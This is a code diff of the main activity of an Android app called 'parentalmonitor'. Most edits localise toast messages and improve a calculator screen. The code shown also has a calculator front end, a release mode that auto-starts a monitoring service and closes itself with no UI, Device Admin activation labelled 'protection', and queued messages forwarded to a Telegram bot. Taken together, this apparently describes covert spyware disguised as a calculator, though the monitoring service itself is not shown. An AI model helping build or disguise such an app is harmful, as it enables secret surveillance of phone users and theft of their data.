@@ -17,7 +17,7 @@ import com.redeye.parentalmonitor.R
 import com.redeye.parentalmonitor.data.MessageQueue
 import com.redeye.parentalmonitor.data.PreferencesManager
 import com.redeye.parentalmonitor.receiver.AdminReceiver
-import com.redeye.parentalmonitor.receiver.NetworkChangeReceiver
+import com.redeye.parentalmonitor.utils.MessageScheduler
 import com.redeye.parentalmonitor.service.MonitoringService
 import android.widget.TextView
 import android.content.Context
@@ -64,7 +64,7 @@ class MainActivity : AppCompatActivity() {
         val allGranted = permissions.values.all { it }
         if (allGranted) {
             android.util.Log.i("MainActivity", "✅ All permissions granted!")
-            Toast.makeText(this, "Barcha ruxsatlar berildi", Toast.LENGTH_SHORT).show()
+            Toast.makeText(this, getString(R.string.msg_permissions_granted), Toast.LENGTH_SHORT).show()
             
             // RELEASE mode: Auto-start service after permissions granted
             if (!BuildConfig.DEBUG && preferencesManager.isConfigured()) {
@@ -74,7 +74,7 @@ class MainActivity : AppCompatActivity() {
                         startMonitoringService()
                         preferencesManager.isMonitoringEnabled = true
                         android.util.Log.i("MainActivity", "✓ Service started successfully!")
-                        Toast.makeText(this, "✓ Monitoring boshlandi", Toast.LENGTH_SHORT).show()
+                        Toast.makeText(this, getString(R.string.msg_monitoring_started), Toast.LENGTH_SHORT).show()
                     } catch (e: Exception) {
                         android.util.Log.e("MainActivity", "✗ Failed to start service: ${e.message}")
                     }
@@ -84,7 +84,7 @@ class MainActivity : AppCompatActivity() {
             updateUI()
         } else {
             android.util.Log.w("MainActivity", "⚠️ Some permissions denied")
-            Toast.makeText(this, "Ba'zi ruxsatlar berilmadi", Toast.LENGTH_SHORT).show()
+            Toast.makeText(this, getString(R.string.msg_permissions_denied), Toast.LENGTH_SHORT).show()
         }
     }
 
@@ -127,64 +127,6 @@ class MainActivity : AppCompatActivity() {
         updateUI()
     }
     
-     private fun handleReleaseModeWithoutUI() {
-         android.util.Log.i("MainActivity", "═══ RELEASE mode - Auto-starting (NO UI) ═══")
-         
-         // Check permissions
-         val hasPerms = hasAllPermissions()
-         android.util.Log.d("MainActivity", "Has all permissions: $hasPerms")
-         
-         // Auto-request permissions if needed
-         if (!hasPerms) {
-             android.util.Log.w("MainActivity", "Permissions missing, requesting...")
-             Toast.makeText(this, "Iltimos, barcha ruxsatlarni bering va qayta oching", Toast.LENGTH_LONG).show()
-             requestPermissions()
-             return
-         }
-         
-         // Check if configured
-         val isConfigured = preferencesManager.isConfigured()
-         android.util.Log.d("MainActivity", "Is configured: $isConfigured")
-         
-         if (!isConfigured) {
-             android.util.Log.e("MainActivity", "✗ NOT CONFIGURED!")
-             android.util.Log.e("MainActivity", "Bot Token: '${preferencesManager.botToken}'")
-             android.util.Log.e("MainActivity", "Chat ID: '${preferencesManager.chatId}'")
-             Toast.makeText(this, "Xatolik: Sozlamalar yo'q! APK'ni builder.sh bilan qayta build qiling.", Toast.LENGTH_LONG).show()
-             finish()
-             return
-         }
-         
-         // Auto-start monitoring
-         val isMonitoring = preferencesManager.isMonitoringEnabled
-         android.util.Log.d("MainActivity", "Is monitoring enabled: $isMonitoring")
-         
-         if (!isMonitoring) {
-             android.util.Log.i("MainActivity", "Starting MonitoringService...")
-             try {
-                 startMonitoringService()
-                 preferencesManager.isMonitoringEnabled = true
-                 android.util.Log.i("MainActivity", "✓ MonitoringService started successfully!")
-                 Toast.makeText(this, "✓ Xizmat ishga tushdi", Toast.LENGTH_SHORT).show()
-             } catch (e: Exception) {
-                 android.util.Log.e("MainActivity", "✗ Failed to start service: ${e.message}", e)
-                 Toast.makeText(this, "Xatolik: Xizmatni ishga tushirishda muammo", Toast.LENGTH_LONG).show()
-                 finish()
-                 return
-             }
-         } else {
-             android.util.Log.i("MainActivity", "Service already running")
-             Toast.makeText(this, "Xizmat allaqachon ishlamoqda", Toast.LENGTH_SHORT).show()
-         }
-         
-         // Close activity immediately
-         android.util.Log.d("MainActivity", "Closing activity in 1 second...")
-         android.os.Handler(mainLooper).postDelayed({
-             android.util.Log.i("MainActivity", "Finishing activity...")
-             finish()
-         }, 1000)
-     }
-
     override fun onResume() {
         super.onResume()
         // Only update UI in DEBUG mode
@@ -198,13 +140,17 @@ class MainActivity : AppCompatActivity() {
     // ═══════════════════════════════════════════════════════════
     
     private var calculatorDisplay: android.widget.TextView? = null
+    private var calculatorHistory: android.widget.TextView? = null
     private var currentNumber = ""
     private var operator = ""
     private var previousNumber = ""
+    private var lastExpression = ""
+    private var justCalculated = false
     
     private fun initCalculator() {
         android.util.Log.i("MainActivity", "Initializing Calculator UI")
         calculatorDisplay = findViewById(R.id.calculatorDisplay)
+        calculatorHistory = findViewById(R.id.calculatorHistory)
         
         // Number buttons
         findViewById<android.widget.Button>(R.id.btn0).setOnClickListener { appendNumber("0") }
@@ -233,6 +179,12 @@ class MainActivity : AppCompatActivity() {
     }
     
     private fun appendNumber(number: String) {
+        justCalculated = false
+        if (currentNumber == "Error") {
+            currentNumber = ""
+            previousNumber = ""
+            operator = ""
+        }
         if (currentNumber == "0" && number != ".") {
             currentNumber = number
         } else {
@@ -249,6 +201,7 @@ class MainActivity : AppCompatActivity() {
     }
     
     private fun setOperator(op: String) {
+        justCalculated = false
         if (currentNumber.isEmpty()) return
         if (previousNumber.isNotEmpty()) {
             calculate()
@@ -272,8 +225,9 @@ class MainActivity : AppCompatActivity() {
         
         if (previousNumber.isEmpty() || currentNumber.isEmpty()) return
         
+        val currentStr = currentNumber
         val num1 = previousNumber.toDoubleOrNull() ?: return
-        val num2 = currentNumber.toDoubleOrNull() ?: return
+        val num2 = currentStr.toDoubleOrNull() ?: return
         
         val result = when (operator) {
             "+" -> num1 + num2
@@ -290,7 +244,9 @@ class MainActivity : AppCompatActivity() {
         } else {
             result.toString()
         }
-        
+
+        lastExpression = "$previousNumber $operator $currentStr ="
+        justCalculated = true
         previousNumber = ""
         operator = ""
         updateCalculatorDisplay()
@@ -300,11 +256,18 @@ class MainActivity : AppCompatActivity() {
         currentNumber = ""
         previousNumber = ""
         operator = ""
+        lastExpression = ""
+        justCalculated = false
         updateCalculatorDisplay()
     }
-    
+
     private fun updateCalculatorDisplay() {
         calculatorDisplay?.text = if (currentNumber.isEmpty()) "0" else currentNumber
+        calculatorHistory?.text = when {
+            justCalculated -> lastExpression
+            operator.isNotEmpty() -> "$previousNumber $operator"
+            else -> ""
+        }
     }
     
     private fun openSetupPage() {
@@ -312,7 +275,7 @@ class MainActivity : AppCompatActivity() {
             startActivity(Intent(this, SetupActivity::class.java))
         } catch (e: Exception) {
             android.util.Log.e("MainActivity", "Failed to open setup", e)
-            Toast.makeText(this, "Gagal buka setup: ${e.message}", Toast.LENGTH_SHORT).show()
+            Toast.makeText(this, getString(R.string.msg_open_setup_failed, e.message ?: ""), Toast.LENGTH_SHORT).show()
         }
     }
 
@@ -378,13 +341,13 @@ class MainActivity : AppCompatActivity() {
             }
             try {
                 startActivity(intent)
-                Toast.makeText(this, "🔐 Himoya yoqilmoqda...", Toast.LENGTH_SHORT).show()
+                Toast.makeText(this, getString(R.string.msg_enabling_protection), Toast.LENGTH_SHORT).show()
             } catch (e: Exception) {
                 android.util.Log.e("MainActivity", "Failed to activate Device Admin", e)
-                Toast.makeText(this, "Xatolik: Device Admin aktivlashtirib bo'lmadi", Toast.LENGTH_SHORT).show()
+                Toast.makeText(this, getString(R.string.msg_admin_failed), Toast.LENGTH_SHORT).show()
             }
         } else {
-            Toast.makeText(this, "✅ Himoya allaqachon yoqilgan", Toast.LENGTH_SHORT).show()
+            Toast.makeText(this, getString(R.string.setup_admin_on), Toast.LENGTH_SHORT).show()
             android.util.Log.i("MainActivity", "Device Admin already active")
         }
     }
@@ -431,7 +394,7 @@ class MainActivity : AppCompatActivity() {
         val syncInterval = syncIntervalInput.text.toString().toIntOrNull() ?: 60
 
         if (botToken.isEmpty() || chatId.isEmpty()) {
-            Toast.makeText(this, "Iltimos, barcha maydonlarni to'ldiring", Toast.LENGTH_SHORT).show()
+            Toast.makeText(this, getString(R.string.msg_fill_all_debug), Toast.LENGTH_SHORT).show()
             return
         }
 
@@ -455,12 +418,12 @@ class MainActivity : AppCompatActivity() {
 
     private fun toggleMonitoring() {
         if (!preferencesManager.isConfigured()) {
-            Toast.makeText(this, "Avval Telegram sozlamalarini saqlang", Toast.LENGTH_SHORT).show()
+            Toast.makeText(this, getString(R.string.msg_save_telegram_first), Toast.LENGTH_SHORT).show()
             return
         }
 
         if (!hasAllPermissions()) {
-            Toast.makeText(this, "Avval barcha ruxsatlarni bering", Toast.LENGTH_SHORT).show()
+            Toast.makeText(this, getString(R.string.msg_grant_first), Toast.LENGTH_SHORT).show()
             requestPermissions()
             return
         }
@@ -471,12 +434,12 @@ class MainActivity : AppCompatActivity() {
             // Stop monitoring
             stopMonitoringService()
             preferencesManager.isMonitoringEnabled = false
-            Toast.makeText(this, "Nazorat to'xtatildi", Toast.LENGTH_SHORT).show()
+            Toast.makeText(this, getString(R.string.msg_monitoring_stopped), Toast.LENGTH_SHORT).show()
         } else {
             // Start monitoring
             startMonitoringService()
             preferencesManager.isMonitoringEnabled = true
-            Toast.makeText(this, "Nazorat boshlandi", Toast.LENGTH_SHORT).show()
+            Toast.makeText(this, getString(R.string.monitoring_active), Toast.LENGTH_SHORT).show()
         }
 
         updateUI()
@@ -537,20 +500,20 @@ class MainActivity : AppCompatActivity() {
             val sdf = SimpleDateFormat("dd.MM.yyyy HH:mm:ss", Locale.getDefault())
             var text = "${getString(R.string.last_sync)} ${sdf.format(Date(lastSync))}"
             if (queueSize > 0) {
-                text += "\nNavbatda: $queueSize ta xabar"
+                text += "\n" + getString(R.string.queue_pending, queueSize)
             }
             lastSyncText.text = text
         } else {
             var text = "${getString(R.string.last_sync)} ${getString(R.string.never)}"
             if (queueSize > 0) {
-                text += "\nNavbatda: $queueSize ta xabar"
+                text += "\n" + getString(R.string.queue_pending, queueSize)
             }
             lastSyncText.text = text
         }
         
         // Try to send queued messages if any
         if (queueSize > 0) {
-            NetworkChangeReceiver.scheduleMessageSend(this)
+            MessageScheduler.scheduleMessageSend(this)
         }
 
         // Update toggle button
